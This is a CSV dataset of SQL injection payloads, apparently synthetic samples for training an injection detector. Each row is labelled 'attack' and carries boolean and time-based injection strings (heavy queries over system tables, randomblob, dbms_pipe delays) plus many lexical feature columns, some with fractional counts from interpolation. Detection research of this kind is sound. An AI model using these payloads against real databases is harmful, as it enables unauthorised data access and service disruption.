id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000087,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001187,0.3008617356340423,144.21706906884378,30.648779856745197,4.097327319341782,68.9463395702356,18.0,37.946339570235594,19.3243899283726,0.4781019566862955,0.12502767305139176,0.2627765197644541,0.13409385049785863,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.324389928372598,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000088,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000071,0.43832661096537345,73.21169462471765,26.0,3.821056050280811,14.807796416478439,24.0,24.807796416478435,9.59610179176078,0.20207363282229635,0.32794802389014377,0.3387186427765229,0.131259700511037,0.0,0.0,3.0,0.0,0.0,2.0,0.0,3.0000000000000004,0.0,0.596101791760782,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000089,attack,boolean,"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",nearest_attack_euclidean,R000871,0.4747432466787375,67.38907352615792,20.59271568410528,3.5209261031337187,9.389073526157915,24.0,24.0,10.0,0.13904214129347495,0.3562584242923552,0.3562584242923552,0.14844101012181468,1.0,0.0,3.0,0.0,0.20364215794736062,2.0,0.0,3.0000000000000004,0.0,0.0,0.7963578420526395,5.20364215794736,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000090,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000717,0.0738629422391817,146.0,32.36715001225409,4.1230613265138665,68.0,18.0,40.0,20.0,0.4657534246575342,0.1232876712328767,0.273972602739726,0.136986301369863,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000091,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R001053,1.2272658878472635,126.994073877195,32.0,3.7304542208659353,45.399051820351204,13.0,51.79573319158041,16.7992888652634,0.35942053096715,0.10336789882667263,0.40480742234697664,0.1324041478592007,0.0,4.0,0.0,0.0,1.0,1.4002370449121997,0.0,8.399051820351202,0.0,1.0,1.0,2.4002370449122,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000092,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000249,0.486567908136928,146.39431825163803,29.816903406181748,3.837163620207558,48.0,16.0,55.66193187636502,26.732386375273002,0.32907995604621476,0.1096933186820716,0.3785631162972449,0.1826636089744688,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.732386375273004,0.0,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000093,attack,boolean,"1""  )   where 7578  =  7578 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000693,0.09951807388813591,155.0,36.47379094454733,4.34378349661059,77.0,17.0,43.0,18.0,0.4967741935483871,0.10967741935483871,0.27741935483870966,0.11612903225806452,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,3.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000094,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001189,0.35756221624894113,99.95532162593034,28.0,3.569241692539364,31.0,13.0,41.46276802160862,14.492553604321722,0.3109226359213241,0.1303869118379746,0.4137549375470304,0.14493551469367089,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.492553604321723,0.0,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000095,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001503,0.28040962188397095,136.1238280141268,36.12382801412678,3.807805273133436,42.0,23.0,54.0,17.123828014126776,0.308544397993059,0.16896478937715137,0.3966999402767901,0.1257908723529995,2.0,0.12382801412677691,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.12382801412677696,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000096,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R000615,0.04856843791093873,163.46805131173045,28.151985339505586,3.7736124416635484,74.46805131173045,16.0,57.0,16.0,0.45547835042504314,0.09789153250785743,0.348738584559242,0.09789153250785743,0.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000097,attack,boolean,"1'   )    )    as ydbt where 8062  =  8062 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000492,0.2530874662205916,166.20589211388267,34.74705947425885,4.241760615057885,81.48235684555307,17.0,48.97647579407076,18.747059474258844,0.49039512782890926,0.10244781153943053,0.29428843974132873,0.11286862089033142,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.747059474258845,0.0,0.0,3.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000098,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000001,0.0,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000099,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",nearest_attack_euclidean,R000982,0.21897489775190582,128.3267564047699,27.556103632935844,3.974159670447373,80.0,3.0000000000000018,31.43896367064157,13.887792734128315,0.6247431187966521,0.023427866954874463,0.24373201496899286,0.10809699927948052,3.0,0.0,0.0,0.0,1.0,1.0,0.0,3.887792734128314,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000100,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  '%'  =  '",nearest_attack_euclidean,R001311,0.2623843777491534,142.43784509072646,35.0,3.857435947346336,51.0,10.0,55.19820424227204,26.239640848454407,0.35866313430954655,0.07032610476657776,0.3867625680655646,0.18424819285831112,3.0,0.0,0.0,0.0,0.0,1.0,0.0,11.239640848454407,1.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,boolean,"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000503,0.7703054689810618,161.79097847426442,36.0,4.345885753918502,83.39548923713221,16.485069891018888,42.970139782037776,18.94027956407555,0.5154809144422348,0.1019480884718342,0.26581983471260734,0.11675116237332372,1.9701397820377744,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.4850698910188873,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000102,attack,boolean,1'||  (  select 'hshf' where 9073  =  9073 and 7533  =  7533  )  ||',nearest_attack_euclidean,R000837,0.5164684927635367,73.29482104823039,24.79422315723456,3.8103242407304796,18.79422315723456,18.058964209646078,23.647410524115195,12.794223157234558,0.25780421053205266,0.24699157894986912,0.3203263157799123,0.174877894738166,4.0,0.0,0.0,0.0,0.0,2.0,0.0,2.529482104823039,0.0,0.0,0.26474105241151946,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000103,attack,boolean,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000007,0.7605373153896037,71.13767116287413,22.712557054291374,3.3447710019547103,26.0,5.0,30.137671162874124,10.0,0.365624104220063,0.07031232773462749,0.4234389125760546,0.14062465546925498,0.0,0.5748858914172508,2.0,0.0,1.0,3.0,0.0,1.7125570542913753,0.0,0.0,0.0,6.712557054291375,0.0,0.2874429457086254,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000104,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000983,0.12212878014684886,161.8755879801611,34.0,4.20616733176713,79.68101287345863,16.0,48.0,18.194575106702466,0.49216191531582437,0.0988670293137531,0.2966010879412593,0.11236996742916322,2.1945751067024664,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000105,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001178,0.6091123834799267,150.6036375550056,30.0,3.8851599693585857,72.39636244499438,8.0,49.463378665723916,20.74389644428732,0.4814467665751416,0.05314607234350284,0.32774264832397065,0.13766451275738495,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.743896444287319,2.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000106,attack,boolean,-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,nearest_attack_euclidean,R001337,1.0111206561983572,83.48931713699764,22.97863427399527,3.2817022833908194,14.957268547990537,16.0,39.02136572600473,13.510682863002366,0.17901494072034504,0.19164815344349367,0.46746997558498093,0.16186693025118035,4.0,0.0,1.0,0.0,1.0,1.5106828630023652,0.0,6.0,0.0,0.0,0.0,3.510682863002365,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,boolean,-9555'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'rwpq' like 'rwpq,nearest_attack_euclidean,R000444,0.44882554790386686,93.80046109533487,26.002305476674362,3.239919770391963,16.20184438133949,16.0,46.39907780933025,15.199538904665127,0.1726567757063852,0.17057797099915833,0.49470282586269043,0.16206242743176608,4.0,0.0,1.0,0.0,1.0,1.1995389046651275,0.0,8.0,0.0,0.0,0.0,3.1995389046651277,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000108,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000646,0.3239262561143575,69.8960900283007,26.116872022640568,3.649325799287359,11.116872022640571,16.0,28.0,14.779218005660141,0.15846027171742885,0.22912133152948969,0.40096233017660693,0.21145606657647448,4.0,0.0,1.0,0.0,0.0,2.0,0.0,4.0,2.0,0.7792180056601417,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000109,attack,boolean,"1%""   )    )     )   and 7758  =  4792 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000651,0.8874587510793608,72.75266631892231,17.407249869595866,2.7248200077396043,7.407249869595866,10.876333159461154,40.0,14.469083289865289,0.10099458744373818,0.14844588577687162,0.5514574340754955,0.19910209270389473,0.0,4.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,0.4690832898652886,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000110,attack,boolean,1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000455,0.3634584729480928,71.16918831546784,15.144612554364521,2.5341004923207806,6.0,9.578450217458087,41.156900434916174,14.433837663093566,0.0847109851806751,0.13395278988360898,0.5785125254296934,0.20282369950602253,4.0,0.0,0.0,0.0,0.14461255436452214,2.0,0.0,6.2892251087290445,2.0,0.0,0.0,2.1446125543645222,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001422,0.051198071000097066,112.904021390582,29.952010695291005,3.775497535835896,43.688069519391526,13.0,42.167962566481485,14.047989304708995,0.38686164768252285,0.11514554858508029,0.37354963640561534,0.12444316732678155,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.047989304708996,0.0,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000112,attack,boolean,"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'bwrb' like 'bwrb",nearest_attack_euclidean,R001395,0.2291663724528809,139.9503010980249,31.0,4.197038402121193,80.21482986389262,8.0,36.38837698730584,15.347094246826462,0.5734836432178083,0.05727545697297376,0.25959555923926575,0.10964534056995219,4.0,0.0,0.0,0.0,1.0,1.0,0.0,4.347094246826461,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000113,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R001200,1.335706675528369,140.14894597270066,33.4729958440539,3.625721700641959,42.5270041559461,15.0,61.675950128646775,20.945991688107796,0.304254943652688,0.1072578845775962,0.439041341393412,0.14944583037630374,2.0,4.0,0.0,1.0,0.0,2.0,0.0,10.945991688107796,0.0,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.527004155946102,0.47299584405389783,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000114,attack,boolean,"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000719,0.20546412608768858,149.17916333375925,33.0,3.3021594195554256,34.0,15.0,74.54333066700741,25.635832666751853,0.22807329137439228,0.10062056972399658,0.4994798984243302,0.17182624047728096,6.0,0.0,0.0,1.0,0.0,2.0,0.0,13.635832666751849,2.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000115,attack,boolean,"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""liar""  =  ""liar",nearest_attack_euclidean,R000369,0.9004570126929726,145.38198313825612,34.0,4.147259214801496,61.84264418434151,15.0,47.0,21.539338953914623,0.42506980143049206,0.10321176498895923,0.32339686363207226,0.14832156994847642,4.0,4.0,0.0,0.0,0.0,2.0,0.0,6.0,0.5393389539146229,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000116,attack,boolean,"1' where 7190  =  7190 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001082,0.5000020017138033,129.9522766632679,36.238069165816974,3.905612664501582,39.47613833163394,23.0,50.47613833163394,17.0,0.3033741929876398,0.17734876710918765,0.3881931685615991,0.13108387134157348,2.5873102780610098,0.0,2.0,1.0,0.0,2.0,0.0,8.41268972193899,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
